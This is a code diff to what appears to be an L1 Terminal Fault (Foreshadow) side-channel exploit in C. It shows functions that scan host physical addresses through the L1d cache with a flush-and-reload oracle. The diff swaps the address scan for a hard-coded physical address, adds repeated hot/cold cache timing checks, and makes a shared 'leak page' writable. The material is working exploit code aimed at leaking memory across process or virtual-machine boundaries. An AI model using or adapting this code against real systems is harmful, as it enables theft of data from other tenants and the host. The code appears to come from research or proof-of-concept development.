@@ -464,48 +464,58 @@ void l1tf_find_ffff_values(scan_opts_t scan_opts) {
   leak_addr_t leak = l1tf_leak_buffer_create();
 
 
-  unsigned char *p = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
+  unsigned char *p = l1tf_spawn_leak_page();
   assert(p != MAP_FAILED);
   memset(p, 0x97, PAGE_SIZE);
-  // printf("mmapped own page `p`; look up its phys addr now and press ENTER\n");
-  // getchar();
+  *(uint64_t *)(p) = 0x9797979797979999;
+  printf("mmapped own page `p`; look up its phys addr now and press ENTERRRRR\n");
+  getchar();
 
 
   printf("Scanning L1d cache for own page\n");
   uintptr_t own_pa = -1;
-  int found = 0;
-  for (size_t run = 1; run < 1000 && !found; ++run) {
-    printf("run %ld\n", run);
-    for (uintptr_t physical_addr = scan_opts.start; physical_addr < scan_opts.end && !found; physical_addr += scan_opts.stride) {
-      *(volatile char *)(p + (physical_addr & 0xfff));
-      if (l1tf_oracle16_9797(physical_addr, 1, reload_buffer, leak)) {
-        found = 1;
-        printf("\nRun %3ld | HIT! Potential host physical address of phys_map: 0x%lx\n", run, physical_addr);
-        for (int t = 0; t < 10; t += 2) {
-          *(volatile char *)(p + ((physical_addr+t) & 0xfff));
-          if (!l1tf_oracle16_9797(physical_addr+t, 10, reload_buffer, leak)) {
-            printf("No hits at t = %d; i.e. phys_addr = %lx\n", t, physical_addr+t);
-            found = 0;
-            break;
-          }
-        }
-        own_pa = physical_addr & (~0xfffULL);
-      }
-    }
-  }
+  // int found = 0;
+  // for (size_t run = 1; run < 100000000LL && !found; ++run) {
+  //   if (run % 10000000 == 0) printf("run %ld\n", run);
+  //   for (uintptr_t physical_addr = scan_opts.start; physical_addr < scan_opts.end && !found; physical_addr += scan_opts.stride) {
+  //     *(volatile char *)(p + (physical_addr & 0xfff));
+  //     lfence();
+  //     if (l1tf_oracle16_9797(physical_addr, 1, reload_buffer, leak)) {
+  //       found = 1;
+  //       printf("Run %3ld | HIT! Potential host physical address of phys_map: 0x%lx\n", run, physical_addr);
+  //       for (int t = 0; t < 10; t += 2) {
+  //         *(volatile char *)(p + ((physical_addr+t) & 0xfff));
+  //         if (!l1tf_oracle16_9797(physical_addr+t, 10, reload_buffer, leak)) {
+  //           printf("No hits at t = %d; i.e. phys_addr = %lx\n", t, physical_addr+t);
+  //           found = 0;
+  //           break;
+  //         }
+  //       }
+  //       own_pa = physical_addr & (~0xfffULL);
+  //       printf("own_pa = %lx\n", own_pa);
+  //     }
+  //   }
+  // }
+  own_pa = 0x000000046100b000;
   printf("own_pa = %lx\n", own_pa);
 
-  int hot = l1tf_oracle16_9797_touch(own_pa, 100, reload_buffer, leak, p);
-  printf("hot: %d\n", hot);
-  clflush(p);
-  int cold = l1tf_oracle16_9797(own_pa, 100, reload_buffer, leak);
-  printf("cold: %d\n", cold);
+  for (int i = 0; i < 10; i++) {
+    if (i == 7)
+      getchar();
 
-  hot = l1tf_oracle16_9797_touch(own_pa+0x800, 100, reload_buffer, leak, p+0x800);
-  printf("hot: %d\n", hot);
-  clflush(p+0x800);
-  cold = l1tf_oracle16_9797(own_pa+0x800, 100, reload_buffer, leak);
-  printf("cold: %d\n", cold);
+    int hot = l1tf_oracle16_9797_touch(own_pa, 200000, reload_buffer, leak, p);
+    clflush(p);
+    int cold = l1tf_oracle16_9797(own_pa, 200000, reload_buffer, leak);
+    printf("hot: %6d, cold: %6d\n", hot, cold);
+
+    hot = l1tf_oracle16_9797_touch(own_pa+0x800, 200000, reload_buffer, leak, p+0x800);
+    clflush(p+0x800);
+    cold = l1tf_oracle16_9797(own_pa+0x800, 200000, reload_buffer, leak);
+    printf("hot: %6d, cold: %6d\n", hot, cold);
+  }
+
+  printf("early exit\n");
+  return;
 
 
 
@@ -598,7 +608,7 @@ void *l1tf_spawn_leak_page(void) {
       err(EXIT_FAILURE, "Failed to open leak shm page");
     }
 
-    fd = shm_open(leak_page_name, O_RDONLY, S_IRUSR);
+    fd = shm_open(leak_page_name, O_RDWR, S_IRUSR);
     if (fd < 0) {
       err(EXIT_FAILURE, "Failed to open existing leak shm page");
     }
@@ -648,7 +658,7 @@ void *l1tf_spawn_leak_page(void) {
       err(EXIT_FAILURE, "Failed to close rand_file");
     }
   } else {
-    leak_page = mmap(NULL, PAGE_SIZE, PROT_READ, MAP_SHARED | MAP_POPULATE, fd, 0);
+    leak_page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, 0);
     if (leak_page == (void *)-1) {
       err(EXIT_FAILURE, "mmap of leak page failed");
     }
